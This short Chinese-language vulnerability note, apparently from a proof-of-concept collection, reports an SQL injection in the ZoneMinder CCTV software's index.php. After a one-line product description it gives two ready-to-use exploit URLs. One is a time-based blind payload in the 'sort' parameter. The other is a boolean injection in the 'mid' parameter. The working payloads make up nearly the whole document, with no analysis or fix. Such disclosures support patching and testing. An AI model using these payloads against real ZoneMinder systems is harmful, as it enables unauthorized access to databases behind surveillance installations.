# ZoneMinder系统sort接口存在SQL注入漏洞

ZoneMinder 是一款免费、开源的闭路电视软件应用程序，专为 Linux 开发，支持 IP、USB 和模拟摄像机。

## poc

```java
http://host:port/zm/index.php?sort=**if(now()=sysdate()%2Csleep(6)%2C0)**&order=desc&limit=20&view=request&request=watch&mid=1
```

```java
http://host:port/zm/index.php?limit=20&mid=-1%20OR%203*2*1=6%20AND%20000322=000322&order=desc&request=watch&sort=Id&view=request
```

